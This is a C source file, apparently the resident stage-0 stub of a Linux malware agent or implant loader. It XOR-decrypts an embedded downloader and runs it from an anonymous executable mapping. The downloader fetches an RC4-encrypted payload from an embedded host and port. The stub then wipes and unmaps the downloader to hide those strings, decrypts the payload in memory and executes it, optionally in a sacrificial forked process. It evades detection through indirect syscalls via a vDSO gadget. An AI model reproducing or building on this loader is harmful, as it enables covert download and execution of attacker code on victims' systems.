#define _GNU_SOURCE
#include "downloader_blob.h"
#include "rc4.h"
#include "stage_abi.h"
#include "state.h"
#include "syscalls.h"
#include "utils.h"
#if SUPERVISE
#include "supervise.h"
#endif

/*
 * The stub is the only stage that stays resident for the whole agent
 * lifecycle. It runs the downloader from a separate mapping so that, as soon
 * as the agent PIC has been fetched, the downloader can be zeroed and unmapped
 * together with its code, transport tables and the embedded host/port/key
 * strings. Only the supervisor, the encrypted agent PIC and its key remain in
 * memory.
 */

typedef void (*downloader_fn)(struct download_result *);
typedef void (*stage1_entry)(void *base_addr, size_t total_size);

/*
 * Decrypt the downloaded ciphertext in place, flip it to RX, and enter the
 * payload. In supervision mode this runs in the forked child, so copy-on-write
 * confines the plaintext and the RX transition to the sacrificial process; the
 * parent's mapping stays ciphertext RW.
 */
static void stage_run(void *arg) {
  struct download_result *res = (struct download_result *)arg;

  rc4_ctx rc4;
  rc4_init(&rc4, res->key, sizeof(res->key));
  memset(res->key, 0, sizeof(res->key));
  rc4_crypt(&rc4, (uint8_t *)res->data, res->size);

  if (mprotect(res->data, PAGE_ALIGN_UP(res->size),
               PROT_READ | PROT_EXEC) != 0)
    exit(1);

  ((stage1_entry)res->data)(res->data, res->size);
}

static void stub_main(void) __attribute__((used));
static void stub_main(void) {
  /* Per-process mutable state (%r15) and the vDSO syscall gadget must exist
   * before the downloader runs; the downloader reuses the same state. */
  stager_state_init();
  init_indirect_syscalls();

  size_t blob_len = downloader_bin_len;
  /* Anonymous mappings are zero-filled, so any .bss the downloader relies on
   * is covered by the page-aligned length. */
  size_t map_len = PAGE_ALIGN_UP(blob_len);
  void *dl_exec = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (dl_exec == MAP_FAILED)
    exit(1);

  /* Decrypt the downloader blob in place, then make it executable. */
  unsigned char *dst = (unsigned char *)dl_exec;
  for (size_t i = 0; i < blob_len; i++)
    dst[i] = downloader_bin[i] ^ downloader_key[i % sizeof(downloader_key)];
  if (mprotect(dl_exec, map_len, PROT_READ | PROT_EXEC) != 0)
    exit(1);

  /* The downloader no longer needs the encrypted blob or its key. The blob is
   * embedded in the stub (paged with its code), so it cannot be safely wiped
   * in place; only the decrypted, running copy is unmapped below. */

  /* The blob starts with `jmp downloader_main`, which preserves the result
   * pointer in RDI and returns straight back here. */
  struct download_result res = {0};
  ((downloader_fn)dl_exec)(&res);

  /* Unload the downloader and everything it carried: make it writable again,
   * zero it, then unmap. */
  mprotect(dl_exec, map_len, PROT_READ | PROT_WRITE);
  memset(dl_exec, 0, map_len);
  munmap(dl_exec, map_len);

  if (res.data == NULL || res.size == 0)
    exit(1);

#if SUPERVISE
  debug_print("Stage0: supervising Stage1 in a sacrificial process\n");
  supervise_run(stage_run, &res);
#else
  stage_run(&res);
#endif
  exit(0);
}

/* `main` is kept for the shared-object/executable formats, whose loaders enter
 * through it instead of jumping to _start. */
__attribute__((visibility("default"))) int main(void) {
  stub_main();
  return 0;
}

__asm__(".section .init,\"ax\",@progbits\n"
        ".global _start\n"
        "_start:\n"
        "xor %rbp, %rbp\n"
        "and $0xfffffffffffffff0, %rsp\n"
        "call stub_main\n"
        "mov $60, %rax\n"
        "xor %rdi, %rdi\n"
        "syscall\n");
